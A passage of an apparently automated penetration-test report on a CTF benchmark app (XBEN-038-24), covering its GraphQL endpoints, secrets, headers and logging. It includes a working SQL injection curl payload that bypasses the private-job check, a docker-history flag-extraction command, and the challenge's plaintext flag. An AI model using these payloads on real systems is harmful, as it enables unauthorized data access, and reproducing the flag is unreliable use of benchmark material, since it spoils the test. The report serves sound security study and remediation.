This application exposes **three network-accessible HTTP endpoints**, all of which are **in-scope** for penetration testing as they are reachable via the deployed application server on port 80.

#### Entry Point 1: Root Homepage (`/`)

**Route Definition:** `Route("/", endpoint=read_root)` (**line 81 of main.py**)

**Handler Implementation** (**lines 71-73**):
```python
async def read_root(_):
    with open("static/index.html") as f:
        return HTMLResponse(content=f.read(), status_code=200)
```

**HTTP Method:** GET  
**Authentication Required:** No  
**Input Parameters:** None  
**Response Type:** HTML (text/html)

**Security Analysis:**
- **Static File Serving:** The endpoint reads `static/index.html` from disk and returns it verbatim
- **Path Traversal Risk:** The file path is hardcoded (`"static/index.html"`), preventing path traversal attacks
- **No User Input:** The handler ignores all request parameters (accepts `_` as the request object)
- **No Sensitive Data Exposure:** The HTML file contains only frontend code (Bootstrap UI, JavaScript GraphQL client)
- **Attack Vectors:** Limited—this endpoint serves a static file with no dynamic content or user input processing

**Client-Side Attack Surface:** While the endpoint itself is low-risk, the HTML file it serves contains **client-side vulnerabilities**:
- **XSS via innerHTML:** Lines 84-94 of `index.html` render GraphQL response data using `innerHTML` without sanitization
- **GraphQL Injection:** Lines 39-48 construct GraphQL queries using template literals with user input

These vulnerabilities are network-accessible (the HTML is served to clients' browsers) but require the user to interact with the page.

#### Entry Point 2: GraphQL API (`/graphql`)

**Route Definition:** `Mount("/graphql", GraphQL(strawberry.Schema(query=Query)))` (**line 82 of main.py**)

**GraphQL Schema:**
- **Query Type:** `Query` (lines 48-68)
- **Available Fields:** `jobs(jobType: String = ""): [Job]`
- **Return Type:** List of Job objects with fields: `id: int`, `name: str`, `type: str`, `description: str`

**HTTP Method:** POST (for queries), GET (for introspection/GraphiQL)  
**Authentication Required:** No  
**Input Parameters:** 
- `query` (GraphQL query string)
- `variables` (optional GraphQL variables object)
- `operationName` (optional for multiple operations)

**Response Type:** JSON (application/json)

**Security Analysis:**

**This is the PRIMARY ATTACK SURFACE of the application.** The GraphQL endpoint contains multiple critical vulnerabilities:

1. **SQL Injection (CRITICAL)** - **Line 60 of main.py**:
   ```python
   query = f"SELECT * FROM jobs WHERE type = '{job_type}'"
   ```
   
   **Exploitability:** Trivial. The `jobType` parameter from the GraphQL query is directly interpolated into SQL without sanitization.
   
   **Proof of Concept Exploit:**
   ```bash
   curl -X POST http://localhost/graphql/ \
     -H "Content-Type: application/json" \
     -d '{"query":"{ jobs(jobType: \"private'\'' OR '\''1'\''='\''1\") { id name type description } }"}'
   ```
   
   This bypasses the authorization check (line 55-57) and returns all jobs including the private job containing the flag.

2. **Broken Access Control** - **Lines 55-57**:
   ```python
   if job_type and job_type == 'private':
       conn.close()
       raise Exception("Only admins can see private jobs")
   ```
   
   **Exploitability:** The check validates the parameter value, not user identity. Bypassable via SQL injection.

3. **GraphQL Introspection Enabled:**
   Strawberry GraphQL enables introspection by default unless explicitly disabled. Attackers can query `__schema` to discover the complete API structure:
   ```graphql
   {
     __schema {
       types {
         name
         fields { name type { name } }
       }
     }
   }
   ```
   
   This reveals the `jobs` query, the `jobType` parameter, and the `Job` type structure, providing a roadmap for exploitation.

4. **No Query Complexity Limiting:**
   GraphQL allows clients to request deeply nested or computationally expensive queries. Without complexity limits, attackers could perform denial-of-service attacks via resource-exhaustive queries.

5. **No Rate Limiting:**
   The endpoint accepts unlimited requests. Attackers can perform brute-force attacks, automated vulnerability scanning, or DoS attacks without throttling.

**Input Validation:** The `jobType` parameter is typed as `str` in the GraphQL schema but has **zero validation logic**. Any string value is accepted—no allowlist of valid job types, no regex pattern matching, no length limits, no special character filtering.

**Attack Vectors:**
- **SQL Injection → Flag Extraction:** Primary attack path (detailed in Section 9)
- **GraphQL Introspection → Schema Discovery:** Reveals API structure
- **Query Complexity → DoS:** Craft expensive queries to exhaust server resources
- **Error Message Mining → Information Disclosure:** Trigger SQL errors to leak database structure

#### Entry Point 3: Health Check (`/ping`)

**Route Definition:** `Route("/ping", endpoint=ping)` (**line 83 of main.py**)

**Handler Implementation** (**lines 76-77**):
```python
async def ping(_):
    return HTMLResponse(content="pong", status_code=200)
```

**HTTP Method:** GET  
**Authentication Required:** No  
**Input Parameters:** None  
**Response Type:** HTML (text/html) containing "pong"

**Security Analysis:**
- **Static Response:** Always returns the string "pong" regardless of input
- **No User Input Processing:** Ignores all request parameters
- **No Sensitive Data:** Response contains no confidential information
- **Purpose:** Docker health check endpoint (used in `docker-compose.yml` health check configuration)
- **Attack Vectors:** None—this endpoint is functionally inert from a security perspective

**Docker Health Check Configuration** (`docker-compose.yml`, **lines 9-13**):
```yaml
healthcheck:
  test: ["CMD", "curl", "-f", "http://localhost:80/ping"]
  timeout: 1s
  retries: 5
  interval: 10s
```

The Docker daemon uses this endpoint to verify the application is responsive. The endpoint is **in-scope** as it's network-accessible, but presents **minimal security risk**.

### Out-of-Scope Components

The following components are **out-of-scope** as they are not network-accessible and require local execution:

1. **Build System (Makefile):** Local-only build automation requiring `make` command execution
2. **Docker Build Process:** Requires local `docker build` or `docker-compose build` commands
3. **Database Initialization (startup() function):** Executes at application startup, not triggered by network requests
4. **Static File System:** Files in `app/static/` are not directly accessible (only served through the `/` endpoint)

### Internal Service Communication

**NOT APPLICABLE:** This is a monolithic application with **no internal service-to-service communication**. All functionality exists within a single Python process with no microservices, no message queues, no service mesh, and no inter-process communication mechanisms.

**Trust Relationships:** Since there are no internal services, there are no trust relationships to analyze. The application trusts itself completely—the web layer has direct access to the database layer with no intermediary services or API gateways.

From a security architecture perspective, this eliminates several attack vectors:
- ❌ No service-to-service authentication to bypass
- ❌ No internal API endpoints to discover
- ❌ No message queue poisoning
- ❌ No service mesh sidecars to compromise

However, it also means **zero defense in depth**. If the web layer is compromised (which it is, via SQL injection), the attacker has immediate access to all data with no additional security boundaries to bypass.

### Input Validation Patterns

**FINDING:** Input validation is **comprehensively absent** throughout the application. There are **no validation functions**, **no sanitization libraries**, and **no input filtering mechanisms**.

**GraphQL Input Validation:**

The `jobs` resolver accepts a `jobType` parameter with the following (lack of) validation:

**Parameter Definition** (**line 51 of main.py**):
```python
def jobs(self, _info: Info, job_type: str = "") -> List[Job]:
```

**Validation Analysis:**
- **Type Hint:** `str` (enforced by Strawberry GraphQL—non-string inputs are rejected at the GraphQL layer)
- **Default Value:** `""` (empty string if not provided)
- **Length Validation:** NONE—accepts strings of any length
- **Character Validation:** NONE—accepts any characters including SQL metacharacters (`'`, `"`, `;`, `--`)
- **Allowlist Validation:** NONE—no check that `job_type` is one of the expected values (`"front-end"`, `"back-end"`, `"private"`)
- **Sanitization:** NONE—no escaping of special characters

**Secure Implementation Example:** A proper input validation implementation would include:
```python
ALLOWED_JOB_TYPES = {"front-end", "back-end"}  # "private" excluded

def jobs(self, _info: Info, job_type: str = "") -> List[Job]:
    # Validate against allowlist
    if job_type and job_type not in ALLOWED_JOB_TYPES:
        raise ValueError(f"Invalid job type. Must be one of: {ALLOWED_JOB_TYPES}")
    
    # Use parameterized query
    if job_type:
        query = "SELECT * FROM jobs WHERE type = ?"
        cursor.execute(query, (job_type,))
    # ... rest of implementation
```

This would prevent SQL injection by using parameterized queries AND prevent access to private jobs by excluding `"private"` from the allowlist.

**Frontend Input Validation:**

The HTML frontend (`static/index.html`) has a dropdown selector for job types:

**Dropdown Definition** (**lines 14-23**):
```html
<select class="form-control" id="job-type">
    <option value="">All</option>
    <option value="back-end">Back-end</option>
    <option value="front-end">Front-end</option>
    <option value="private">Private</option>
</select>
```

**Client-Side Validation Analysis:**
- **UI Control:** Dropdown limits visible choices to four options
- **Bypassability:** TRIVIAL—attackers can use browser DevTools to modify the dropdown, intercept HTTP requests, or send requests directly via curl/Postman
- **Server-Side Validation:** NONE—the server accepts any value regardless of the dropdown options

The presence of `<option value="private">Private</option>` is interesting from a CTF perspective—it signals to players that "private" jobs exist and should be investigated, even though accessing them is supposedly restricted.

**Search for Validation Functions:**

Comprehensive search for common validation patterns reveals **zero implementations**:
- `sanitize`, `escape`, `clean`, `validate`, `strip`, `filter`: No functions found
- `re.compile`, `re.match`, `re.search`: No regex validation
- `bleach`, `html.escape`, `markupsafe`: No sanitization libraries imported
- `sqlalchemy` ORM: Not used (raw SQL instead)

### Background Processing

**NOT APPLICABLE:** This application has **no background job processing**, **no async task queues**, and **no scheduled jobs**.

Analysis of the codebase reveals:
- ❌ No Celery, RQ, or other task queue frameworks
- ❌ No cron jobs or scheduled tasks
- ❌ No webhook processing in the background
- ❌ No asynchronous job workers

All request processing is **synchronous and immediate**:
1. Client sends HTTP request
2. Starlette routes to handler
3. Handler processes request (database query)
4. Response returned immediately
5. Request complete

From a security perspective, this eliminates several attack vectors:
- No job queue poisoning attacks
- No privilege escalation via background job execution
- No race conditions between web requests and background tasks

However, it also means **no rate limiting via job queues**. All database queries execute synchronously in the request-response cycle, making the application vulnerable to slow-query DoS attacks.

---

## 6. Infrastructure & Operational Security

### Secrets Management

**CRITICAL FINDING:** Secrets management is **comprehensively insecure**, violating every industry best practice. The CTF flag (the application's most sensitive secret) is stored in **plaintext across multiple locations** with **zero encryption** and **zero access control**.

**Secret Storage Locations:**

1. **Environment File** (`.env`):
   - **Path:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/.env`
   - **Content:** `FLAG="flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"`
   - **Permissions:** 644 (world-readable)
   - **Risk Level:** CRITICAL
   - **Exposure Vector:** If this file is committed to Git, the flag becomes permanently visible in repository history. The `.gitignore` file should exclude `.env`, but developers frequently make mistakes.

2. **Docker Build Argument** (`docker-compose.yml`):
   - **Lines 4-6:**
     ```yaml
     build: 
       context: ./app
       args:
         - FLAG
     ```
   - **Risk Level:** CRITICAL
   - **Exposure Vector:** Docker build arguments are visible in `docker history <image>` output and stored in image metadata. Anyone with access to the Docker image can extract the flag:
     ```bash
     docker history xben-038-24_app | grep FLAG
     ```

3. **Container Filesystem** (`/app/flag.txt`):
   - **Creation:** Dockerfile line 11 uses `sed` to inject flag into `flag.txt`
   - **Runtime Access:** Application reads this file at startup (main.py line 19-20)
   - **Risk Level:** HIGH
   - **Exposure Vector:** Any code execution vulnerability (command injection, arbitrary file read) would expose this file

4. **SQLite Database** (`test.db`):
   - **Location:** Application working directory (`/app/test.db` in container)
   - **Storage:** Flag stored in `jobs.description` field where `type='private'`
   - **Encryption:** NONE
   - **Risk Level:** CRITICAL
   - **Exposure Vector:** SQL injection (primary attack), database file exfiltration, direct filesystem access

**Secrets Management Anti-Patterns Detected:**

- ❌ **Secrets in Version Control:** `.env` file may be committed to Git
- ❌ **Secrets in Docker Build Args:** Flag embedded in image layers
- ❌ **Secrets in Plaintext Files:** `flag.txt` readable by any process
- ❌ **Secrets in Database:** Flag stored unencrypted in database
- ❌ **No Secret Rotation:** Flag is static, no rotation mechanism
- ❌ **No Secret Versioning:** No tracking of when flag was created or when it should expire
- ❌ **No Secrets Manager:** No use of HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, etc.
- ❌ **No Environment Separation:** Same flag used across all environments (no dev/staging/prod separation)

**Proper Secret Management Implementation:** A secure implementation would use:
- **Docker Secrets** (for Swarm) or **Kubernetes Secrets** (for K8s) to inject secrets at runtime
- **External Secrets Manager** to centralize secret storage and enable audit logging
- **Environment Variables** read at runtime (not build time) from secure sources
- **Secret Rotation** policies to periodically change sensitive values
- **Least Privilege Access** where only the application process can read secrets

### Configuration Security

**Environment Separation:** The application has **no environment separation**. There's no distinction between development, staging, and production configurations. All environments use the same flag value, the same database, and the same security settings (or lack thereof).

**Configuration Files:**

1. **docker-compose.yml** - Container orchestration configuration
   - Exposes port 80 for HTTP traffic
   - Passes FLAG as build argument (INSECURE)
   - No environment-specific overrides (no `docker-compose.override.yml`)

2. **Dockerfile** - Container build configuration
   - Uses `python:3.12` base image
   - Installs dependencies without version pinning (except for Python packages)
   - Runs as root (no USER directive)
   - Embeds flag in image via `sed` command

3. **No Application Configuration File:**
   The application has **no `config.py`, `settings.py`, or `config.json`**. All configuration is hardcoded in `main.py`:
   - Database path: `'test.db'` (line 13)
   - Server host: `'0.0.0.0'` (assumed from Uvicorn defaults)
   - Server port: `80` (from Dockerfile CMD)

**Secret Handling:** As documented above, secret handling is critically insecure. The flag is treated as a build-time constant rather than a runtime secret, violating the **Twelve-Factor App** principle of storing config in the environment.

**Security Headers Configuration:**

**CRITICAL FINDING:** The application implements **ZERO security headers**. Comprehensive analysis reveals no HTTP security headers are configured at any layer of the infrastructure:

**Application Layer** (Python/Starlette):
The HTTP response handlers (`read_root()`, `ping()`) return `HTMLResponse` objects with default headers only:
```python
return HTMLResponse(content=f.read(), status_code=200)
```

No custom headers are added. Starlette does not add security headers by default.

**Reverse Proxy Layer:** **NONE EXISTS**

The application is exposed directly via Uvicorn on port 80 with no nginx, Apache, Caddy, or Traefik reverse proxy in front. This means there's no infrastructure layer to inject security headers.

**CDN/WAF Layer:** **NONE EXISTS**

No Content Delivery Network or Web Application Firewall is configured. CloudFlare, Fastly, AWS CloudFront, etc. could add security headers, but none are present.

**Missing Security Headers:**

- ❌ **Strict-Transport-Security (HSTS):**
  - **File Location:** N/A (not configured anywhere)
  - **Impact:** No HTTPS enforcement. Even if HTTPS were enabled, browsers wouldn't remember to use it.
  - **Recommended Value:** `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`

- ❌ **Content-Security-Policy (CSP):**
  - **File Location:** N/A
  - **Impact:** No XSS mitigation. Inline scripts execute freely, enabling reflected/stored XSS attacks.
  - **Recommended Value:** `Content-Security-Policy: default-src 'self'; script-src 'self' https://stackpath.bootstrapcdn.com`

- ❌ **X-Frame-Options:**
  - **File Location:** N/A
  - **Impact:** Application can be embedded in iframes, enabling clickjacking attacks
  - **Recommended Value:** `X-Frame-Options: DENY`

- ❌ **X-Content-Type-Options:**
  - **File Location:** N/A
  - **Impact:** Browsers may MIME-sniff responses, potentially executing malicious content
  - **Recommended Value:** `X-Content-Type-Options: nosniff`

- ❌ **Referrer-Policy:**
  - **File Location:** N/A
  - **Impact:** Full referrer URLs may leak sensitive information to external sites
  - **Recommended Value:** `Referrer-Policy: strict-origin-when-cross-origin`

- ❌ **Permissions-Policy:**
  - **File Location:** N/A
  - **Impact:** Browser features (geolocation, camera, microphone) unrestricted
  - **Recommended Value:** `Permissions-Policy: geolocation=(), camera=(), microphone=()`

- ❌ **Cache-Control:**
  - **File Location:** N/A
  - **Impact:** Sensitive responses may be cached by browsers or proxies
  - **Recommended Value:** `Cache-Control: no-store, max-age=0` (for sensitive pages)

**Infrastructure Configuration Files:**

No infrastructure-as-code configurations exist for security header injection:
- ❌ No nginx.conf (no reverse proxy)
- ❌ No Kubernetes Ingress annotations
- ❌ No Traefik labels
- ❌ No Caddy configuration

### External Dependencies

**Python Package Dependencies:**

The application has **minimal external dependencies**, all explicitly pinned in the Dockerfile (**line 5**):

```dockerfile
RUN pip3 install --no-cache-dir strawberry-graphql==0.235.0 uvicorn==0.29.0 starlette==0.37.2
```

**Dependency Analysis:**

1. **strawberry-graphql==0.235.0**
   - **Purpose:** GraphQL server implementation
   - **Security Implications:** 
     - Introspection enabled by default (information disclosure)
     - No built-in query complexity limiting (DoS risk)
     - Relies on developer to implement field-level authorization
   - **Known Vulnerabilities:** None identified in CVE databases at time of analysis
   - **Latest Version:** 0.235.0 is recent (2024 release)

2. **uvicorn==0.29.0**
   - **Purpose:** ASGI web server
   - **Security Implications:**
     - Production-ready server with no known critical vulnerabilities
     - Supports HTTP only (HTTPS requires SSL certificates and configuration, not implemented)
     - No built-in rate limiting or WAF functionality
   - **Known Vulnerabilities:** None identified
   - **Latest Version:** 0.29.0 is recent

3. **starlette==0.37.2**
   - **Purpose:** ASGI web framework
   - **Security Implications:**
     - Minimal security middleware by default (developer must add CORS, CSRF, sessions)
     - No built-in authentication or authorization
     - Secure when properly configured, but this application adds zero security middleware
   - **Known Vulnerabilities:** None identified
   - **Latest Version:** 0.37.2 is recent

**Frontend Dependencies:**

The HTML frontend loads Bootstrap CSS from a CDN:

**CDN Link** (`static/index.html`, **line 6**):
```html
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
```

**Security Implications:**
- **Third-Party Dependency:** Relies on StackPath CDN availability
- **No Subresource Integrity (SRI):** No `integrity` attribute to verify the CSS hasn't been tampered with
- **CDN Compromise Risk:** If StackPath CDN is compromised, malicious CSS could be injected
- **Version:** Bootstrap 4.5.2 (released 2020) is outdated; latest is 5.x

**Secure Implementation:** Should use SRI:
```html
<link rel="stylesheet" 
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
      integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z"
      crossorigin="anonymous">
```

**No Other External Services:**

The application does **not** integrate with:
- ❌ No external APIs (no HTTP requests to third parties)
- ❌ No authentication providers (no OAuth, SAML, LDAP)
- ❌ No payment processors
- ❌ No email services
- ❌ No cloud storage (S3, Azure Blob, etc.)
- ❌ No analytics or monitoring SaaS (Datadog, New Relic, Sentry)

This isolation reduces the external attack surface but also means **no external security services** (no WAF, no DDoS protection, no bot detection).

### Monitoring & Logging

**CRITICAL FINDING:** The application has **ZERO monitoring and logging infrastructure**. There is **no visibility into security events**, **no audit trails**, and **no anomaly detection**.

**Logging Analysis:**

**Python Logging:** The application does not import or configure Python's `logging` module. No log statements exist in the codebase:
- No `import logging`
- No `logger.info()`, `logger.warning()`, `logger.error()` calls
- No log configuration (no `logging.basicConfig()`)

**Web Server Logging:** Uvicorn provides access logs by default, but these are **ephemeral** (printed to stdout) and **not persisted**. The Docker container has no volume mounts for log storage, so logs are lost when the container stops.

**GraphQL Query Logging:** Strawberry GraphQL does not log queries by default. There's no record of:
- Which queries were executed
- What parameters were provided
- Whether queries succeeded or failed
- How long queries took to execute

**Database Logging:** SQLite has no query logging enabled. There's no record of:
- SQL queries executed
- Query execution times
- Database errors
- Connection events

**Security Event Logging:** **COMPLETELY ABSENT**

The following security-relevant events are **not logged**:
- ❌ Failed authorization attempts (the "Only admins can see private jobs" exception)
- ❌ SQL injection attempts (malicious `jobType` parameters)
- ❌ Unusual query patterns (high request rates, repeated errors)
- ❌ Database access (who queried what data when)
- ❌ Container start/stop events
- ❌ File access (reading `flag.txt`)

**Monitoring Infrastructure:** **NONE EXISTS**

No monitoring tools are configured:
- ❌ No Prometheus metrics scraping
- ❌ No Grafana dashboards
- ❌ No Datadog/New Relic APM
- ❌ No Sentry error tracking
- ❌ No CloudWatch/Stackdriver logs
- ❌ No ELK stack (Elasticsearch, Logstash, Kibana)

**Security Implications:**

The absence of logging creates **zero forensic capability**:
- **No incident response:** If an attack occurs, there's no log data to analyze
- **No breach detection:** Successful SQL injection attacks leave no trace
- **No audit trail:** No record of who accessed what data when
- **No performance monitoring:** No ability to detect slow-query DoS attacks
- **No compliance:** Fails audit requirements (PCI-DSS Requirement 10, GDPR Article 30)

**Health Check Endpoint:** The `/ping` endpoint provides minimal application health visibility (Docker health checks), but it's binary (up/down) with no metrics on request rates, error rates, or resource utilization.

---

## 7. Overall Codebase Indexing

This is an **intentionally minimal CTF challenge application** consisting of only **200 lines of code** across two primary files. The codebase organization is deliberately simple, eschewing enterprise patterns like layered architecture, dependency injection, or separation of concerns. This minimalism serves the CTF purpose—creating a small attack surface that participants can thoroughly analyze—but would be completely inappropriate for production systems.

The project structure follows a **flat single-directory layout** with minimal organizational hierarchy:

```
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/
├── app/                          # Application container directory
│   ├── main.py                   # Entire backend application (92 lines)
│   ├── Dockerfile                # Container build configuration (13 lines)
│   ├── flag.txt                  # Flag placeholder (replaced at build time)
│   └── static/
│       └── index.html            # Complete frontend application (107 lines)
├── outputs/                      # Scan results and artifacts
│   ├── scans/                    # Security scan outputs (empty)
│   └── schemas/                  # API schema exports (empty - no external schemas)
├── .env                          # Environment variables (contains FLAG)
├── docker-compose.yml            # Container orchestration (14 lines)
├── Makefile                      # Build automation (references external common.mk)
├── benchmark.json                # CTF metadata (challenge ID, category, difficulty)
└── .xben_build_done              # Build completion marker (contains container ID)
```

**Total Project Metrics:**
- **Total Files:** 10 files (excluding build artifacts)
- **Total Lines of Code:** ~200 lines (92 Python + 107 HTML + 1 Makefile)
- **Dependencies:** 3 Python packages (Strawberry, Uvicorn, Starlette)
- **Database Tables:** 1 (jobs)
- **API Endpoints:** 3 HTTP routes + 1 GraphQL query
- **Project Size on Disk:** 196 KB

The codebase's **organizational anti-patterns** reflect its CTF nature:

1. **No Package Structure:** The entire backend is a single `main.py` file with no package hierarchy (no `src/`, `app/`, or `pkg/` directories). There are no modules, no code reuse, no separation of concerns.

2. **No Layered Architecture:** Database access, business logic, and HTTP handlers are intermixed in the same functions. The `jobs()` GraphQL resolver (lines 48-68) performs authorization, SQL query construction, database access, and response serialization all in one method.

3. **No Configuration Management:** No `config.py`, no `settings.yaml`, no environment-specific configurations. All values are hardcoded in the source code (database path: `'test.db'`, server port: `80`).

4. **No Testing Infrastructure:** Zero test files, no `tests/` directory, no `pytest` or `unittest` imports. The application is completely untested beyond manual verification.

5. **No Documentation:** No README.md (the `benchmark.json` file serves as minimal metadata), no docstrings in Python code, no API documentation beyond the implicit GraphQL schema.

The **build orchestration** uses a **Makefile-based build system** that delegates to an external `../common.mk` file (not present in the scanned directory). This suggests the challenge is part of a larger benchmark suite where common build steps are shared across multiple challenges. The build process creates a marker file `.xben_build_done` containing the container ID (`0afa9120d479`), indicating a successful build.

From a **security analysis discoverability** perspective, this structure is ideal for penetration testing:

- **Single Entry Point:** All backend code in one file makes vulnerability discovery linear—read `main.py` from top to bottom to find all attack surfaces.
- **No Code Generation:** No ORM abstractions, no code generation, no metaprogramming. All SQL queries are visible as literal strings in the source.
- **No Build Complexity:** No webpack bundles to reverse-engineer, no minified JavaScript, no transpilation. The frontend `index.html` is delivered as-is.
- **Predictable Deployment:** Single container, single process, single database file. No service mesh, no load balancers, no complex networking.

The **GraphQL schema definition** is entirely **inline** (no separate `.graphql` schema files), defined using Strawberry's decorator syntax:

```python
@strawberry.type
class Job:
    id: int
    name: str
    type: str
    description: str

@strawberry.type
class Query:
    @strawberry.field
    def jobs(self, _info: Info, job_type: str = "") -> List[Job]:
        # Implementation
```

This code-first approach means there are **no external API schema files** (no OpenAPI/Swagger JSON, no GraphQL SDL files). The schema is discoverable via GraphQL introspection queries rather than documentation files. For a penetration tester, this means the first step is running an introspection query to map the API:

```graphql
{
  __schema {
    queryType { name }
    types {
      name
      fields { name type { name kind } }
    }
  }
}
```

The **Docker containerization** strategy is minimal:
- **Base Image:** `python:3.12` (official Python image, relatively heavy at ~1GB)
- **No Multi-Stage Build:** Single stage means all build tools remain in final image
- **No .dockerignore:** No file exclusions, entire `app/` directory copied
- **No Health Check in Dockerfile:** Health check defined in docker-compose.yml instead
- **No USER Directive:** Container runs as root

The **CTF metadata** file (`benchmark.json`) contains:
```json
{
  "name": "XBEN-038-24",
  "category": "SQL Injection",
  "difficulty": "Easy",
  "description": "Ultimate Job Aggregator - Bypass authorization to extract the flag"
}
```

This explicitly signals to participants that the vulnerability class is **SQL Injection** and the difficulty is **Easy**, confirming that straightforward exploitation is expected.

From a **penetration testing workflow** perspective, the codebase structure enables rapid analysis:

1. **Reconnaissance (5 minutes):** Read `benchmark.json` → identify vulnerability class. Read `docker-compose.yml` → understand deployment. Read `Dockerfile` → see flag injection process.

2. **Source Code Analysis (15 minutes):** Read `main.py` (92 lines) → identify SQL injection at line 60. Read `index.html` (107 lines) → understand client-side GraphQL query construction.

3. **Exploitation (5 minutes):** Craft SQL injection payload → send GraphQL query → extract flag.

Total time to compromise: **25 minutes** for a thorough analysis, **under 10 minutes** for experienced penetration testers who recognize the SQL injection pattern immediately.

**Code Conventions and Quality:**

- **Python Style:** Follows PEP 8 loosely (4-space indentation, snake_case naming)
- **Type Hints:** Uses type hints inconsistently (GraphQL schema uses them, helper functions don't)
- **Error Handling:** Minimal—only the authorization check raises an exception
- **Code Comments:** ZERO comments in the codebase
- **Docstrings:** ZERO docstrings

The code quality is **intentionally poor from a security perspective** but **adequate for CTF functionality**. The application works as designed—it serves a web interface, processes GraphQL queries, and stores data in a database—but implements zero security controls.

**Significant Tooling and Conventions:**

1. **ASGI Framework (Starlette):** Modern async web framework, but security middleware must be explicitly added
2. **Strawberry GraphQL:** Code-first GraphQL library using decorators and type hints
3. **SQLite3:** Embedded database, no separate database server required
4. **Docker Compose:** Orchestration for single-container deployment
5. **No ORM:** Raw SQL via `sqlite3` module (enables SQL injection)
6. **No Frontend Framework:** Vanilla JavaScript, no React/Vue/Angular
7. **Bootstrap 4.5.2:** CDN-hosted CSS framework for UI styling

**Impact on Security Component Discoverability:**

The minimal structure makes security components **immediately discoverable**:
- **Authentication:** None—no auth functions exist
- **Authorization:** Lines 55-57 of main.py (single `if` statement)
- **SQL Query Construction:** Lines 60-64 (f-string injection)
- **Database Schema:** Lines 23-28 (CREATE TABLE statement)
- **Flag Storage:** Lines 30-35 (INSERT statement)
- **API Endpoints:** Lines 80-84 (route definitions)
- **GraphQL Schema:** Lines 40-45 (Job type), lines 48-68 (Query type)

No complex abstraction layers obscure the vulnerability. The SQL injection is **literally visible on-screen** when reading `main.py`—line 60 shows user input being interpolated into a SQL query, which is the canonical example of SQL injection shown in security textbooks.

---

## 8. Critical File Paths

### Configuration

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/.env`**  
  Environment variables file containing the FLAG in plaintext (644 permissions, world-readable)

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/docker-compose.yml`**  
  Container orchestration defining port mappings, build arguments (FLAG passed insecurely), and health checks

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/Dockerfile`**  
  Container build configuration with flag injection via `sed` command (line 11), root user execution, and dependency installation

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/benchmark.json`**  
  CTF metadata indicating vulnerability class (SQL Injection), difficulty (Easy), and challenge description

### Authentication & Authorization

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (lines 55-57)**  
  Broken authorization check attempting to restrict "private" job access—bypassable via SQL injection

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (lines 48-68)**  
  GraphQL `jobs` resolver with no authentication, broken authorization, and SQL injection vulnerability

**NOTE:** No session management files exist (no session cookie configuration, no JWT handling, no OAuth callbacks)

### API & Routing

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (lines 80-84)**  
  Complete route definitions: `/` (homepage), `/graphql` (API endpoint), `/ping` (health check)

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (lines 40-45)**  
  GraphQL `Job` type definition (schema defined inline, no external .graphql files)

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (line 82)**  
  GraphQL endpoint mount point with Strawberry schema initialization

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/static/index.html` (lines 39-48)**  
  Client-side GraphQL query construction with unsanitized user input interpolation

### Data Models & DB Interaction

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (lines 12-15)**  
  Database connection function using SQLite3 with no encryption, authentication, or connection pooling

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (lines 23-28)**  
  Database schema definition (`jobs` table with id, name, type, description fields)

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (lines 30-35)**  
  Flag insertion into database in the `description` field where `type='private'`

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (line 60)**  
  **CRITICAL SQL INJECTION:** F-string SQL query construction with unsanitized user input from `job_type` parameter

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (line 64)**  
  SQL query execution point (executes the vulnerable query from line 60)

### Dependency Manifests

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/Dockerfile` (line 5)**  
  Python package installation: `strawberry-graphql==0.235.0 uvicorn==0.29.0 starlette==0.37.2`

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/static/index.html` (line 6)**  
  Bootstrap CSS CDN dependency (no SRI integrity check, potential supply chain risk)

**NOTE:** No traditional dependency manifest files exist (no `requirements.txt`, `Pipfile`, `package.json`)—dependencies are directly installed in Dockerfile

### Sensitive Data & Secrets Handling

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/.env` (line 1)**  
  **CRITICAL:** Plaintext FLAG storage: `FLAG="flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"`

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/flag.txt`**  
  Flag placeholder file (contains literal "FLAG" before build, actual flag after `sed` substitution at build time)

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/Dockerfile` (lines 9-11)**  
  Flag injection into container: `ARG FLAG` → `RUN sed -i s/FLAG/$FLAG/g flag.txt`

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (lines 19-20)**  
  Flag file read at application startup: `with open("flag.txt") as f: flag = f.read()`

- **`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/app/main.py` (line 34)**  
  Flag insertion into database: `f'("Hidden job", "private", "{flag}")'`

**NOTE:** No encryption libraries exist (no `cryptography`, `pycryptodome`, no key management)—all secrets stored in plaintext

### Middleware & Input Validation

